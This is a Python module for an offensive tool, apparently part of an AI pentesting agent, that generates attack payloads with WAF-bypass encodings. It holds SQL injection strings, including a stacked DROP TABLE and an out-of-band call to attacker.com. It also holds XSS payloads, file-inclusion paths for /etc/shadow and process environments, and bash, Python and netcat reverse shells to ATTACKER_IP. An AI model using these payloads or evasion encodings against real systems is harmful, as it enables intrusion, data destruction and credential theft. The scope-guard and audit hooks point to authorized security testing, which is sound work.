"""payload_gen -- CUSTOM: Adaptive payload generation for vulnerability exploitation."""

import base64
import json
import urllib.parse

_WAF_BYPASS_ENCODINGS = {
    "url_double": lambda s: urllib.parse.quote(urllib.parse.quote(s, safe=""), safe=""),
    "url_single": lambda s: urllib.parse.quote(s, safe=""),
    "base64": lambda s: base64.b64encode(s.encode()).decode(),
    "unicode": lambda s: "".join(
        f"\\u{ord(c):04x}" for c in s
    ),
    "hex": lambda s: "".join(f"{ord(c):02x}" for c in s),
    "html_entity": lambda s: "".join(f"&#{ord(c)};" for c in s),
    "sql_comment": lambda s: s.replace(" ", "/**/"),
    "null_byte": lambda s: s.replace(" ", "%00"),
}

_SQLI_PAYLOADS = {
    "basic": "' OR 1=1 --",
    "union": "' UNION SELECT null --",
    "boolean_blind": "' AND 1=1 --",
    "time_blind": "'; WAITFOR DELAY '0:0:5' --",
    "stacked": "';DROP TABLE users;--",
    "out_of_band": "'||UTL_HTTP.request('http://attacker.com/')--",
}

_XSS_PAYLOADS = {
    "basic": "<script>alert(1)</script>",
    "img_onerror": "<img src=x onerror=alert(1)>",
    "svg_onload": "<svg onload=alert(1)>",
    "dom": "javascript:alert(document.domain)",
    "polyglot": "javascript://\"/</title></style></textarea></script>--><p\" onclick=alert()//",
}

_LFI_PAYLOADS = {
    "etc_passwd": "/etc/passwd",
    "etc_shadow": "/etc/shadow",
    "proc_self": "/proc/self/environ",
    "win_boot": "C:/boot.ini",
    "win_hosts": "C:/Windows/System32/drivers/etc/hosts",
    "null_byte": "/etc/passwd%00",
    "php_filter": "php://filter/convert.base64-encode/resource=index.php",
}

_RCE_PAYLOADS = {
    "whoami": "whoami",
    "id": "id",
    "uname": "uname -a",
    "reverse_bash": "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1",
    "reverse_python": (
        "python -c 'import socket,subprocess,os;s=socket.socket();"
        "s.connect((\"ATTACKER_IP\",4444));os.dup2(s.fileno(),0);"
        "os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
    ),
    "reverse_nc": "nc -e /bin/sh ATTACKER_IP 4444",
}

_PAYLOAD_MAP = {
    "sqli": _SQLI_PAYLOADS,
    "xss": _XSS_PAYLOADS,
    "lfi": _LFI_PAYLOADS,
    "rce": _RCE_PAYLOADS,
}


def payload_generator(
    vuln_type: str,
    target_info: str = "",
    constraints: str = "",
) -> str:
    """Generate a custom payload for a specific vulnerability type.

    Adapts encoding and bypass techniques based on target technology stack.

    Args:
        vuln_type: Vulnerability type (sqli, xss, lfi, rce, ssrf, etc.)
        target_info: Target technology stack info (e.g. \"Apache 2.4, PHP 7.4\")
        constraints: Any constraints (WAF present, filtered chars, etc.)

    Returns:
        JSON string with payloads and encoding options.
    """
    payloads = _PAYLOAD_MAP.get(vuln_type.lower(), {})
    if not payloads:
        # Unknown vuln type -- generate generic test strings
        payloads = {"probe": "'\"><script>alert(1)</script>"}

    constraint_lower = constraints.lower()
    applicable_encodings = list(_WAF_BYPASS_ENCODINGS.keys())

    if "waf" in constraint_lower or "filter" in constraint_lower:
        if "sql" in constraint_lower:
            applicable_encodings = ["sql_comment", "url_double", "null_byte"]
        elif "xss" in constraint_lower:
            applicable_encodings = ["unicode", "html_entity", "base64"]
        elif "lfi" in constraint_lower:
            applicable_encodings = ["url_double", "null_byte", "php_filter"]

    if "apache" in target_info.lower():
        applicable_encodings = [
            e for e in applicable_encodings if e != "null_byte"
        ]

    result_payloads = []
    for name, payload in payloads.items():
        entry: dict = {
            "name": name,
            "payload": payload,
            "encodings": {},
        }
        for enc_name in applicable_encodings:
            try:
                encoder = _WAF_BYPASS_ENCODINGS[enc_name]
                entry["encodings"][enc_name] = encoder(payload)
            except Exception:
                entry["encodings"][enc_name] = "[encoding error]"
        result_payloads.append(entry)

    return json.dumps({
        "success": True,
        "vuln_type": vuln_type,
        "target_info": target_info,
        "constraints": constraints,
        "payloads": result_payloads,
        "total": len(result_payloads),
    })


def register_all(scope_guard=None, audit_logger=None):
    """Register payload generator with the adapter."""
    from spider.tools.adapter import make_tool
    return {
        "payload_generator": make_tool(
            payload_generator,
            scope_guard=scope_guard,
            audit_logger=audit_logger,
        ),
    }
